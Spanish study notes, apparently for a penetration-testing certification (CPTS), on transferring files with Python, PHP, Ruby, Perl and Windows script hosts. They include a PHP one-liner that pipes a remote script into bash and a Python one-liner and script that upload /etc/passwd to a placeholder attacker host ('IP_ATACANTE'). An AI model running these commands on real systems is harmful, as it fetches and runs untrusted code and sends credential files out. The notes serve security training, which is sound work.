
## 1. Transferencia de archivos con Python

Python permite descargar archivos mediante código ejecutado directamente desde la terminal usando `-c`.

### Python 2.7 — Descargar un archivo

```
python2.7 -c 'import urllib;urllib.urlretrieve("https://servidor/archivo.sh", "archivo.sh")'
```

### Python 3 — Descargar un archivo

```
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://servidor/archivo.sh", "archivo.sh")'
```

**Diferencia principal:**

- Python 2.7: `urllib.urlretrieve()`.
    
- Python 3: `urllib.request.urlretrieve()`.

## 2. Transferencia de archivos con PHP

PHP permite descargar contenido web y guardarlo en un archivo mediante distintas funciones.

### Método 1: `file_get_contents()` y `file_put_contents()`

```
php -r '$file = file_get_contents("https://servidor/archivo.sh"); file_put_contents("archivo.sh", $file);'
```

- `file_get_contents()`: obtiene el contenido de una URL.
    
- `file_put_contents()`: escribe el contenido en un archivo.
    
- `-r`: ejecuta código PHP directamente desde la terminal.
    

### Método 2: `fopen()` y `fread()`

```
php -r 'const BUFFER = 1024; $fremote = fopen("https://servidor/archivo.sh", "rb"); $flocal = fopen("archivo.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

Funciones importantes:

- `fopen()`: abre un archivo o recurso.
    
- `fread()`: lee datos.
    
- `fwrite()`: escribe datos.
    
- `fclose()`: cierra el recurso.
    
- `rb`: abre para lectura binaria.
    
- `wb`: abre para escritura binaria.
    

### Método 3: Ejecutar contenido mediante una tubería

```
php -r '$lines = @file("https://servidor/script.sh"); foreach ($lines as $line) { echo $line; }' | bash
```

Obtiene el contenido remoto y lo envía directamente a Bash sin guardarlo previamente como archivo.

**Importante:** El acceso a URLs mediante estas funciones depende de que los _URL wrappers_ de PHP estén habilitados. Ejecutar contenido remoto directamente también implica un riesgo de seguridad.

## 3. Transferencia de archivos con Ruby y Perl

### Ruby — Descargar un archivo

```
ruby -e 'require "net/http"; File.write("archivo.sh", Net::HTTP.get(URI.parse("https://servidor/archivo.sh")))'
```

Funciones importantes:

- `-e`: ejecuta código directamente desde la terminal.
    
- `Net::HTTP.get()`: obtiene el contenido HTTP.
    
- `File.write()`: guarda el contenido en un archivo.
    

### Perl — Descargar un archivo

```
perl -e 'use LWP::Simple; getstore("https://servidor/archivo.sh", "archivo.sh");'
```

- `-e`: ejecuta código directamente.
    
- `LWP::Simple`: proporciona funciones para acceder a recursos web.
    
- `getstore()`: descarga el recurso y lo guarda en un archivo.
    

**Nota:** El método de Perl requiere que el módulo `LWP::Simple` esté disponible.

## 4. Transferencia de archivos con JavaScript en Windows

Windows permite ejecutar determinados scripts JavaScript mediante Windows Script Host, utilizando `cscript.exe`.

### Crear el script `wget.js`

```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");

WinHttpReq.Open("GET", WScript.Arguments(0), false);
WinHttpReq.Send();

BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

### Ejecutar la descarga

```
cscript.exe /nologo wget.js https://servidor/archivo.ps1 archivo.ps1
```

**Funcionamiento:**

1. `WinHttp.WinHttpRequest.5.1` realiza la petición HTTP GET.
    
2. `WScript.Arguments(0)` obtiene la URL.
    
3. `ADODB.Stream` permite trabajar con los datos binarios.
    
4. `WScript.Arguments(1)` indica el nombre del archivo de salida.
    

Este método utiliza componentes de Windows y no necesita Python ni PowerShell para realizar la descarga.

## 5. Transferencia de archivos con VBScript en Windows

VBScript también permite descargar archivos mediante componentes integrados en Windows.

### Crear el script `wget.vbs`

```
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")

xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

### Ejecutar la descarga

```
cscript.exe /nologo wget.vbs https://servidor/archivo.ps1 archivo.ps1
```

**Componentes importantes:**

- `Microsoft.XMLHTTP`: realiza la petición HTTP.
    
- `ADODB.Stream`: permite guardar la respuesta como datos binarios.
    
- `WScript.Arguments.Item(0)`: obtiene la URL.
    
- `WScript.Arguments.Item(1)`: obtiene la ruta del archivo de salida.
    
- `SaveToFile` / `savetofile`: guarda el contenido descargado.

## 6. Subida de archivos con Python 3

El módulo `requests` permite enviar peticiones HTTP, incluyendo solicitudes POST para subir archivos.

### Paso 1. Iniciar el servidor de subida

En la máquina que recibirá los archivos:

```
python3 -m uploadserver
```

Por defecto, el servidor escucha en el puerto `8000` y expone el endpoint `/upload`.

### Paso 2. Subir un archivo mediante un one-liner

Desde la máquina que enviará el archivo:

```
python3 -c 'import requests;requests.post("http://IP_ATACANTE:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

**Elementos importantes:**

- `requests.post()`: envía una petición HTTP POST.
    
- `files`: contiene los archivos que se adjuntan a la petición.
    
- `open("/etc/passwd", "rb")`: abre el archivo en modo lectura binaria.
    
- `/upload`: endpoint de recepción de `uploadserver`.
    

### Código equivalente, separado en varias líneas

```
import requests

URL = "http://IP_ATACANTE:8000/upload"

file = open("/etc/passwd", "rb")

response = requests.post(URL, files={"files": file})

file.close()
```

El módulo `requests` debe estar instalado en la máquina desde la que se ejecuta el código.

## 8. Puntos clave para CPTS

- **No dependas de una única herramienta:** si no están disponibles `curl` o `wget`, comprueba qué lenguajes y componentes están instalados.
    
- **Python:** utiliza `urllib.request.urlretrieve()` en Python 3 para descargar archivos.
    
- **PHP:** recuerda las funciones `file_get_contents()`, `file_put_contents()` y `fopen()`.
    
- **Ruby y Perl:** pueden realizar descargas desde una línea de comandos mediante `-e`.
    
- **Windows:** `cscript.exe` puede ejecutar scripts JavaScript y VBScript utilizando componentes integrados.
    
- **Subidas HTTP:** `requests.post()` permite enviar archivos a un servidor que admita cargas mediante POST.
    
- **Dependencias:** algunos métodos requieren módulos adicionales, como `requests` o `LWP::Simple`.
    
- **Ejecución directa:** las tuberías permiten enviar contenido a un intérprete sin guardarlo previamente, pero no garantizan que no se generen archivos temporales.
    
- **Orientación durante la enumeración:** comprueba qué lenguajes, intérpretes y componentes están disponibles antes de elegir el método de transferencia.
